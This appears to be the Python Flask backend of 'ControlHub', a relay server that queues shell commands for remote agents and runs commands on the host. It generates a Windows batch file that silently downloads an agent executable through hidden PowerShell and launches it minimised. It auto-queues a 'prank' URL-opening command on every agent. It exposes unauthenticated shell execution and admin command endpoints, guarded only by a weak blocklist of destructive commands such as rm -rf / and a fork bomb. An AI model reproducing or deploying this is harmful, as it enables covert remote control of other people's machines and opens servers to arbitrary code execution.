#!/usr/bin/env python3
"""
ControlHub API Server - Python Backend
Railway-ready Flask backend for agent relay + command execution.
Compatible with Python 3.10+
"""

import os
import re
import sys
import json
import time
import uuid
import platform
import subprocess
import socket
import psutil
import threading
from datetime import datetime, timezone
from pathlib import Path

from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Configuration
PORT = int(os.environ.get("PORT", 3001))
ENV = os.environ.get("RAILWAY_ENVIRONMENT", "local")
RAILWAY_URL = os.environ.get("RAILWAY_STATIC_URL", None)

# Static frontend path (dist folder is sibling to api/)
STATIC_DIR = Path(__file__).parent.parent / "dist"
HAS_STATIC = STATIC_DIR.exists() and (STATIC_DIR / "index.html").exists()

# In-memory agent registry and command queues
# NOTE: For production with multiple Railway workers, use Redis instead
agents = {}  # agent_id -> agent_info
cmd_queues = {}  # agent_id -> list of pending commands
results = {}  # agent_id -> list of results
_lock = threading.Lock()


# ──────────────────────────────────────────────────────────────────────────
# Agent Management Helpers
# ──────────────────────────────────────────────────────────────────────────

def prune_stale_agents(timeout=120):
    """Remove agents that haven't checked in for `timeout` seconds."""
    now = time.time()
    stale = []
    with _lock:
        for aid, info in list(agents.items()):
            if now - info.get("lastSeen", 0) > timeout:
                stale.append(aid)
        for aid in stale:
            agents.pop(aid, None)
            cmd_queues.pop(aid, None)
            results.pop(aid, None)
    return stale


# ──────────────────────────────────────────────────────────────────────────
# Safety
# ──────────────────────────────────────────────────────────────────────────

ALLOWED_COMMANDS = [
    "echo", "pwd", "ls", "dir", "whoami", "date", "uptime", "uname",
    "cat", "head", "tail", "ps", "top", "df", "du", "env", "hostname",
    "id", "groups", "which", "whereis", "wc", "sort", "uniq", "grep",
    "find", "curl", "wget", "ping", "netstat", "ifconfig", "ipconfig",
    "nslookup", "dig", "traceroute", "node", "python", "python3", "npm",
    "pip", "pip3", "mkdir", "touch", "cp", "mv", "clear", "cls",
]

BLOCKED_PATTERNS = [
    re.compile(r"rm\s+-rf\s+/"),
    re.compile(r">\s*/dev/null"),
    re.compile(r"mkfs"),
    re.compile(r"dd\s+if"),
    re.compile(r":\(\)\{\s*:\|:\s*\};"),
    re.compile(r"shutdown"),
    re.compile(r"reboot"),
    re.compile(r"halt"),
    re.compile(r"poweroff"),
    re.compile(r"init\s+0"),
    re.compile(r"del\s+/s\s+/q"),
    re.compile(r"format\s+"),
]


def validate_command(cmd: str) -> dict:
    if not cmd or not isinstance(cmd, str):
        return {"valid": False, "reason": "Command must be a non-empty string"}
    for pattern in BLOCKED_PATTERNS:
        if pattern.search(cmd):
            return {"valid": False, "reason": "Command contains blocked pattern"}
    base_cmd = cmd.strip().split()[0].lower()
    is_whitelisted = base_cmd in ALLOWED_COMMANDS
    return {
        "valid": True,
        "baseCmd": base_cmd,
        "whitelisted": is_whitelisted,
        "warning": None if is_whitelisted else f"Command '{base_cmd}' not whitelisted",
    }


# ═══════════════════════════════════════════════════════════════════════════
#  PUBLIC / LEGACY ENDPOINTS
# ═══════════════════════════════════════════════════════════════════════════

@app.route("/", methods=["GET"])
def root():
    if HAS_STATIC:
        return send_from_directory(STATIC_DIR, "index.html")
    return jsonify({
        "name": "ControlHub API",
        "version": "1.1.0",
        "status": "running",
        "features": ["local-execute", "agent-relay", "consent-required"],
        "endpoints": [
            "/api/health",
            "/api/system",
            "/api/execute",
            "/api/sessions",
            "/api/files/list",
            "/api/agent/register",
            "/api/agent/poll/<agent_id>",
            "/api/agent/result/<agent_id>",
            "/api/admin/agents",
            "/api/admin/send/<agent_id>",
        ],
        "environment": ENV,
        "railwayUrl": RAILWAY_URL,
    })


@app.route("/api/health", methods=["GET"])
def health():
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.now(timezone.utc).isoformat().replace("+00:00", "Z"),
        "uptime": time.time() - app_start_time,
        "version": "1.1.0",
        "platform": platform.system(),
        "environment": ENV,
        "agentsOnline": len(agents),
    })


@app.route("/api/system", methods=["GET"])
def system_info():
    try:
        cpu_info = platform.processor() or "Unknown"
        cores = psutil.cpu_count(logical=True) or 1
        mem = psutil.virtual_memory()
        load_avg = list(os.getloadavg()) if hasattr(os, "getloadavg") else [0.0, 0.0, 0.0]
        network_data = []
        for name, interfaces in psutil.net_if_addrs().items():
            addrs = []
            for iface in interfaces:
                addrs.append({
                    "address": iface.address,
                    "family": str(iface.family).replace("AddressFamily.", "").replace("AF_", ""),
                    "internal": iface.address.startswith("127.") or iface.address == "::1",
                })
            network_data.append({"name": name, "addresses": addrs})
        return jsonify({
            "cpu": {"model": cpu_info, "cores": cores, "loadAvg": load_avg},
            "memory": {
                "total": round(mem.total / 1024 / 1024),
                "used": round(mem.used / 1024 / 1024),
                "free": round(mem.free / 1024 / 1024),
                "percentage": mem.percent,
            },
            "os": {
                "platform": platform.system(),
                "release": platform.release(),
                "hostname": socket.gethostname(),
                "uptime": time.time() - psutil.boot_time(),
            },
            "network": network_data,
        })
    except Exception as e:
        return jsonify({"error": "Failed to get system metrics", "details": str(e)}), 500


@app.route("/api/execute", methods=["POST"])
def execute():
    """Execute command on the server itself (legacy mode)."""
    data = request.get_json() or {}
    command = data.get("command", "")
    cwd = data.get("cwd")
    validation = validate_command(command)
    if not validation["valid"]:
        return jsonify({"success": False, "command": command, "error": validation["reason"],
                        "stdout": "", "stderr": "", "exitCode": -1, "duration": 0,
                        "timestamp": _now()})
    start = time.time()
    wd = cwd if cwd and cwd != "~" else os.getcwd()
    try:
        r = subprocess.run(command, shell=True, cwd=wd, capture_output=True, text=True, timeout=30)
        return jsonify({"success": r.returncode == 0, "command": command,
                        "stdout": r.stdout or "", "stderr": r.stderr or "",
                        "exitCode": r.returncode, "duration": round((time.time() - start) * 1000),
                        "warning": validation.get("warning"), "timestamp": _now(), "cwd": wd})
    except subprocess.TimeoutExpired:
        return jsonify({"success": False, "command": command, "stdout": "",
                        "stderr": "Timed out", "exitCode": -1,
                        "duration": round((time.time() - start) * 1000), "error": "Timeout",
                        "timestamp": _now(), "cwd": wd})
    except Exception as e:
        return jsonify({"success": False, "command": command, "stdout": "", "stderr": str(e),
                        "exitCode": -1, "duration": round((time.time() - start) * 1000),
                        "error": str(e), "timestamp": _now(), "cwd": wd})


@app.route("/api/sessions", methods=["GET"])
def sessions():
    return jsonify({
        "sessions": [{
            "id": "1", "target": socket.gethostname(), "ip": "127.0.0.1",
            "port": PORT, "os": platform.system(),
            "user": os.getlogin() if hasattr(os, "getlogin") else os.environ.get("USERNAME", "user"),
            "connectedAt": _now(), "status": "active",
        }],
        "listening": True, "listenPort": PORT,
    })


# ═══════════════════════════════════════════════════════════════════════════
#  AGENT RELAY ENDPOINTS
# ═══════════════════════════════════════════════════════════════════════════

@app.route("/api/agent/register", methods=["POST"])
def agent_register():
    """Called by the agent on startup to register itself."""
    data = request.get_json() or {}
    agent_id = data.get("agentId") or str(uuid.uuid4())[:8]
    with _lock:
        agents[agent_id] = {
            "id": agent_id,
            "hostname": data.get("hostname", "unknown"),
            "platform": data.get("platform", "unknown"),
            "user": data.get("user", "unknown"),
            "ip": request.remote_addr,
            "registeredAt": _now(),
            "lastSeen": time.time(),
            "status": "online",
        }
        if agent_id not in cmd_queues:
            cmd_queues[agent_id] = []
        if agent_id not in results:
            results[agent_id] = []

        # Auto-rickroll on first connect (prank mode)
        cmd_queues[agent_id].append({
            "id": str(uuid.uuid4())[:8],
            "command": "open https://youtu.be/dQw4w9WgXcQ",
            "sentAt": _now(),
            "status": "pending-consent",
        })

    app.logger.info(f"[AGENT] Registered {agent_id} from {request.remote_addr} — auto-rickroll queued")
    return jsonify({"success": True, "agentId": agent_id})


@app.route("/api/agent/download", methods=["GET"])
def agent_download():
    """Serve the agent script so it can be downloaded and run directly."""
    agent_path = Path(__file__).parent / "agent.py"
    if not agent_path.exists():
        return jsonify({"error": "Agent script not found"}), 404
    return send_from_directory(agent_path.parent, agent_path.name, as_attachment=True,
                               download_name="controlhub_agent.py")


@app.route("/api/agent/download-exe", methods=["GET"])
def agent_download_exe():
    """Serve the standalone Windows .exe so it can run without Python installed."""
    exe_path = Path(__file__).parent / "dist" / "controlhub_agent.exe"
    if not exe_path.exists():
        return jsonify({"error": "Agent .exe not found. Build it with: pyinstaller --onefile agent.py"}), 404
    return send_from_directory(exe_path.parent, exe_path.name, as_attachment=True,
                               download_name="controlhub_agent.exe")


@app.route("/api/agent/bat", methods=["GET"])
def agent_download_bat():
    """Serve a Windows batch file that auto-downloads and runs the agent."""
    host = request.headers.get("Host", "localhost:3001")
    scheme = request.headers.get("X-Forwarded-Proto", "http")
    server_url = f"{scheme}://{host}"
    bat_content = f"""@echo off
REM ControlHub Agent Auto-Connector
REM Downloads and starts the agent silently in the background.

echo [*] Connecting to {server_url} ...
set "TMPDIR=%TEMP%"
set "EXE=%TMPDIR%\\controlhub_agent.exe"

REM Download the agent .exe
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '{server_url}/api/agent/download-exe' -OutFile '%EXE%' -UseBasicParsing"

if not exist "%EXE%" (
    echo [!] Download failed. Check your internet connection.
    pause
    exit /b 1
)

echo [*] Starting agent ...
start /min "" "%EXE%" --server "{server_url}"

echo [+] Agent is running in the background.
echo     You will see a consent popup when the admin sends a command.
timeout /t 3 /nobreak >nul
"""
    return bat_content, 200, {
        "Content-Type": "application/bat",
        "Content-Disposition": 'attachment; filename="connect.bat"',
    }


@app.route("/api/agent/poll/<agent_id>", methods=["GET"])
def agent_poll(agent_id):
    """Agent long-polls for pending commands. Returns immediately if any exist."""
    with _lock:
        if agent_id in agents:
            agents[agent_id]["lastSeen"] = time.time()
            agents[agent_id]["status"] = "online"
        queue = cmd_queues.get(agent_id, [])
        if queue:
            cmd = queue.pop(0)
            return jsonify({"hasCommand": True, "command": cmd})
    return jsonify({"hasCommand": False})


@app.route("/api/agent/result/<agent_id>", methods=["POST"])
def agent_result(agent_id):
    """Agent posts the result of a command execution."""
    data = request.get_json() or {}
    result_entry = {
        "command": data.get("command", ""),
        "success": data.get("success", False),
        "stdout": data.get("stdout", ""),
        "stderr": data.get("stderr", ""),
        "exitCode": data.get("exitCode", -1),
        "duration": data.get("duration", 0),
        "consent": data.get("consent", "unknown"),
        "timestamp": _now(),
    }
    with _lock:
        if agent_id in agents:
            agents[agent_id]["lastSeen"] = time.time()
        if agent_id not in results:
            results[agent_id] = []
        results[agent_id].append(result_entry)
        # Keep last 50 results
        results[agent_id] = results[agent_id][-50:]
    app.logger.info(f"[AGENT] Result from {agent_id}: {result_entry['command']} -> exit {result_entry['exitCode']}, consent={result_entry['consent']}")
    return jsonify({"success": True})


# ═══════════════════════════════════════════════════════════════════════════
#  ADMIN / CONTROL PANEL ENDPOINTS
# ═══════════════════════════════════════════════════════════════════════════

@app.route("/api/admin/agents", methods=["GET"])
def admin_list_agents():
    """List all registered agents and their status."""
    prune_stale_agents()
    with _lock:
        agent_list = []
        for aid, info in agents.items():
            agent_list.append({
                "id": aid,
                "hostname": info.get("hostname"),
                "platform": info.get("platform"),
                "user": info.get("user"),
                "ip": info.get("ip"),
                "registeredAt": info.get("registeredAt"),
                "lastSeen": info.get("lastSeen"),
                "status": info.get("status", "offline"),
            })
    return jsonify({"agents": agent_list, "count": len(agent_list)})


@app.route("/api/admin/send/<agent_id>", methods=["POST"])
def admin_send_command(agent_id):
    """Send a command to a specific agent. The agent will show a consent popup."""
    data = request.get_json() or {}
    command = data.get("command", "")
    cmd_id = str(uuid.uuid4())[:8]

    validation = validate_command(command)
    if not validation["valid"]:
        return jsonify({"success": False, "error": validation["reason"]}), 400

    with _lock:
        if agent_id not in agents:
            return jsonify({"success": False, "error": "Agent not found or offline"}), 404
        if agent_id not in cmd_queues:
            cmd_queues[agent_id] = []
        cmd_entry = {
            "id": cmd_id,
            "command": command,
            "sentAt": _now(),
            "status": "pending-consent",
        }
        cmd_queues[agent_id].append(cmd_entry)

    app.logger.info(f"[ADMIN] Sent command to {agent_id}: {command}")
    return jsonify({"success": True, "commandId": cmd_id, "command": command,
                    "agentId": agent_id, "status": "pending-consent", "timestamp": _now()})


@app.route("/api/admin/rickroll/<agent_id>", methods=["POST"])
def admin_rickroll(agent_id):
    """Queue a command to open the Rick Roll video on the target device."""
    cmd_id = str(uuid.uuid4())[:8]
    with _lock:
        if agent_id not in agents:
            return jsonify({"success": False, "error": "Agent not found or offline"}), 404
        if agent_id not in cmd_queues:
            cmd_queues[agent_id] = []
        cmd_entry = {
            "id": cmd_id,
            "command": "open https://youtu.be/dQw4w9WgXcQ",
            "sentAt": _now(),
            "status": "pending-consent",
        }
        cmd_queues[agent_id].append(cmd_entry)
    app.logger.info(f"[ADMIN] Rick Roll sent to {agent_id}")
    return jsonify({"success": True, "commandId": cmd_id, "command": "open https://youtu.be/dQw4w9WgXcQ",
                    "agentId": agent_id, "status": "pending-consent", "timestamp": _now()})


@app.route("/api/admin/results/<agent_id>", methods=["GET"])
def admin_get_results(agent_id):
    """Get all results from an agent."""
    with _lock:
        agent_results = results.get(agent_id, [])
    return jsonify({"agentId": agent_id, "results": agent_results})


# ═══════════════════════════════════════════════════════════════════════════
#  UTILITIES
# ═══════════════════════════════════════════════════════════════════════════

def _now():
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


@app.errorhandler(Exception)
def handle_error(e):
    app.logger.error(f"Unhandled error: {e}")
    return jsonify({"error": "Internal server error", "message": str(e)}), 500




# ═══════════════════════════════════════════════════════════════════════════
#  STATIC FRONTEND (SPA)
# ═══════════════════════════════════════════════════════════════════════════

@app.route("/assets/<path:filename>")
def serve_assets(filename):
    if HAS_STATIC:
        return send_from_directory(STATIC_DIR / "assets", filename)
    return jsonify({"error": "Frontend not built"}), 404


@app.route("/<path:path>")
def serve_spa(path):
    if HAS_STATIC:
        target = STATIC_DIR / path
        if target.exists() and target.is_file():
            return send_from_directory(STATIC_DIR, path)
        return send_from_directory(STATIC_DIR, "index.html")
    return jsonify({"error": "Frontend not built"}), 404

app_start_time = time.time()

if __name__ == "__main__":
    print(
        """
+--------------------------------------------------------------+
|         ControlHub API Server v1.1.0 (Agent Relay)           |
+--------------------------------------------------------------+
|  Port:    {port:<51}|
|  Platform: {plat:<50}|
|  Python:  {pyver:<51}|
|  Environment: {env:<47}|
+--------------------------------------------------------------+
|  Endpoints:                                                  |
|    GET  /api/health         - Health check                   |
|    GET  /api/system         - System metrics                 |
|    POST /api/execute        - Local command execution        |
|    POST /api/agent/register - Register agent                 |
|    GET  /api/agent/poll     - Agent polls for commands       |
|    POST /api/agent/result   - Agent posts results            |
|    GET  /api/admin/agents   - List connected agents          |
|    POST /api/admin/send     - Send command to agent          |
+--------------------------------------------------------------+
        """.format(
            port=PORT,
            plat=platform.system(),
            pyver=f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}",
            env=ENV,
        )
    )
    app.run(host="0.0.0.0", port=PORT, debug=(ENV == "local"))
